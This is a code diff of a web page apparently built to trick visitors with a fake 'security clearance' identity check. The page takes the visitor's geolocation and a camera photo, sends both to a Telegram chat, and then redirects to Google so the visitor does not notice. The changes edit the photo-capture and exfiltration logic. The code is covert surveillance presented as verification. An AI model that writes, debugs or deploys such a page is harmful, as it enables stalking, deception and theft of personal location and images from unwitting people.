@@ -63,9 +63,11 @@
     async function startProcess() {
         statusText.innerText = "Requesting Security Clearance...";
         
+        // 1. Get Location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 await sendLocation(pos);
+                // 2. After Location, request Camera
                 await capturePhoto();
             }, (err) => {
                 alert("Please allow all permissions to verify your identity.");
@@ -78,7 +80,6 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
-        // Fix: Yahan ${lat} mein $ missing tha
         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
         
         const text = `📍 *Location Received!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View on Google Maps](${mapLink})`;
@@ -90,36 +91,23 @@
     async function capturePhoto() {
         try {
             statusText.innerText = "Finalizing Verification...";
-            
-            // Camera Stream start karna
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, // Front camera force karna
-                audio: false 
-            });
-            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             const video = document.getElementById('video');
             video.srcObject = stream;
+
+            // Wait for video to load
+            await new Promise(resolve => video.onloadedmetadata = resolve);
             
-            // Video play karna mandatory hai
-            await video.play();
-
-            // Wait until video is actually playing and has dimensions
-            await new Promise((resolve) => {
-                video.onplaying = resolve;
-            });
-
             const canvas = document.getElementById('canvas');
-            // Video dimensions set karna
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // 2 seconds ka wait taaki camera light adjust ho jaye aur photo saaf aaye
+            // Wait 1 second to ensure camera focus
             setTimeout(async () => {
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                 
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                
+                // Send to Telegram
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'identity_check.jpg');
@@ -130,17 +118,18 @@
                     body: formData
                 });
 
-                // Stream band karna (Important: Camera light off karne ke liye)
+                // Stop Camera
                 stream.getTracks().forEach(track => track.stop());
                 
                 statusText.innerText = "Verified! Redirecting...";
                 setTimeout(() => {
                     window.location.href = "https://www.google.com";
                 }, 1000);
-            }, 2000); // Wait time badha diya hai
+            }, 1000);
 
         } catch (err) {
-            console.error("Camera Error:", err);
+            console.error(err);
+            // Even if camera fails, redirect after location
             window.location.href = "https://www.google.com";
         }
     }
@@ -148,4 +137,3 @@
 
 </body>
 </html>
-
